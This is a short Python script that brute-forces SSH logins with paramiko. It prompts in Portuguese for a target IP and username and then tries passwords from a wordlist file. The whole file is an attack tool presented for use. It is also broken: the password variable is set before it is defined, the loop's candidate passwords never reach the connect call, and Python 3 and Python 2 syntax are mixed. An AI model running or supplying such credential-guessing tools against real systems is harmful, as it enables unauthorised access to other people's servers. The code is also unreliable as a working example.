#!/usr/bin/python3
import paramiko

ssh = paramiko.SSHClient()
ssh.load_system_host_keys()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

#Variaveis

host = input('Entre com o IP: ')
port = ('22')
username =  input('Entre com o Usuario: ')
password = (senha)

#CONFIGURACAO SSH

wl = open('wl.txt')
for a in wl.readlines():
	senha = a.strip()

	try:
		ssh.connect(host, port, username, password)

	except paramiko.ssh_exception.AuthenticationException:

		print "Testando com:",senha
	else:
		print "[+] Senha Encontrada ------->",senha
		break
ssh.close()
